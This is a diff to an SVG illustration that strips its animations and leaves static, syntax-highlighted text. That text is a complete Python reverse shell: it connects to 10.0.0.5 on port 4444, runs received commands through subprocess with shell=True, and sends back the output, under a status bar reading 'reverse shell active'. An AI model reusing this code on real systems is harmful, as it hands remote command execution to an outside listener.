@@ -22,7 +22,6 @@
     <text x="30" y="222">7</text>
   </g>
 
-  <!-- Code lines (appear sequentially) -->
   <!-- Line 1: import socket, subprocess, os -->
   <g font-family="monospace" font-size="14">
     <text x="60" y="78" fill="#ff7b72">import</text>
@@ -31,7 +30,6 @@
     <text x="195" y="78" fill="#79c0ff">subprocess</text>
     <text x="295" y="78" fill="#ff7b72">,</text>
     <text x="305" y="78" fill="#79c0ff">os</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.05;1" dur="8s" repeatCount="indefinite"/>
   </g>
 
   <!-- Line 2: s = socket.socket(...) -->
@@ -41,7 +39,6 @@
     <text x="90" y="102" fill="#79c0ff">socket</text>
     <text x="150" y="102" fill="#ffa657">.socket</text>
     <text x="215" y="102" fill="#ffa657">(socket.AF_INET, socket.SOCK_STREAM)</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.18;1" dur="8s" begin="0.5s" repeatCount="indefinite"/>
   </g>
 
   <!-- Line 3: s.connect(("10.0.0.5", 4444)) -->
@@ -53,7 +50,6 @@
     <text x="245" y="126" fill="#ffa657">,</text>
     <text x="255" y="126" fill="#79c0ff">4444</text>
     <text x="290" y="126" fill="#ffa657">))</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.32;1" dur="8s" begin="1.0s" repeatCount="indefinite"/>
   </g>
 
   <!-- Line 4: while True: -->
@@ -61,7 +57,6 @@
     <text x="60" y="150" fill="#ff7b72">while</text>
     <text x="115" y="150" fill="#79c0ff">True</text>
     <text x="160" y="150" fill="#ff7b72">:</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.46;1" dur="8s" begin="1.5s" repeatCount="indefinite"/>
   </g>
 
   <!-- Line 5: cmd = s.recv(1024).decode() -->
@@ -73,7 +68,6 @@
     <text x="215" y="174" fill="#ffa657">(1024)</text>
     <text x="270" y="174" fill="#ffa657">.decode</text>
     <text x="335" y="174" fill="#ffa657">()</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.6;1" dur="8s" begin="2.0s" repeatCount="indefinite"/>
   </g>
 
   <!-- Line 6: out = subprocess.run(cmd, shell=True) -->
@@ -83,7 +77,6 @@
     <text x="140" y="198" fill="#79c0ff">subprocess</text>
     <text x="225" y="198" fill="#ffa657">.run</text>
     <text x="270" y="198" fill="#ffa657">(cmd, shell=True)</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.74;1" dur="8s" begin="2.5s" repeatCount="indefinite"/>
   </g>
 
   <!-- Line 7: s.send(out.stdout) -->
@@ -93,28 +86,12 @@
     <text x="160" y="222" fill="#ffa657">(</text>
     <text x="170" y="222" fill="#79c0ff">out.stdout</text>
     <text x="260" y="222" fill="#ffa657">)</text>
-    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.88;1" dur="8s" begin="3.0s" repeatCount="indefinite"/>
   </g>
 
-  <!-- Blinking cursor -->
-  <text x="320" y="222" font-family="monospace" font-size="14" fill="#FF6A00">▌
-    <animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"/>
-  </text>
+  <!-- Static cursor -->
+  <text x="300" y="222" font-family="monospace" font-size="14" fill="#FF6A00">▌</text>
 
-  <!-- Animated status bar -->
+  <!-- Static status bar -->
   <rect x="40" y="245" width="700" height="22" rx="6" fill="#161b22"/>
-  <rect x="42" y="247" width="0" height="18" rx="4" fill="url(#statusGrad)" opacity="0">
-    <animate attributeName="width" values="0;696" dur="8s" repeatCount="indefinite"/>
-    <animate attributeName="opacity" values="0;0.25;0.25;0" keyTimes="0;0.1;0.95;1" dur="8s" repeatCount="indefinite"/>
-  </rect>
-  <defs>
-    <linearGradient id="statusGrad" x1="0" y1="0" x2="1" y2="0">
-      <stop offset="0%" stop-color="#FF6A00"/>
-      <stop offset="100%" stop-color="#FFB347"/>
-    </linearGradient>
-  </defs>
-  <text x="390" y="261" text-anchor="middle" font-family="monospace" font-size="12" fill="#FFB347">
-    <animate attributeName="opacity" values="1;1;0;0" keyTimes="0;0.1;0.95;1" dur="8s" repeatCount="indefinite"/>
-    ═══════ shell connected · reverse shell active ═══════
-  </text>
+  <text x="390" y="261" text-anchor="middle" font-family="monospace" font-size="12" fill="#FFB347">═══ shell connected · reverse shell active ═══</text>
 </svg>
